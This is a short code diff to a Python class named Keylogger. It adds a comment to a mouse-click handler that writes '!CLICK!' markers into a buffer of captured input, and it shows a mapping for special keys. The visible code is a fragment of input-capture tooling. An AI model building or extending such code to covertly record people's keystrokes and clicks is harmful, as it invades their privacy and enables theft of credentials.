@@ -19,6 +19,7 @@ class Keylogger:
         self.shift_keys = 0
         self.special_keys = {'space': ' ', 'shift': '', 'right shift': '', 'enter': '\n', 'tab': '\t'}
 
+    # Add !CLICK! to the buffer when the user clicks
     def __handle_click(self, x, y, mouse_button, pressed):
         if pressed:
             self.local_buffer_raw += "!CLICK!"
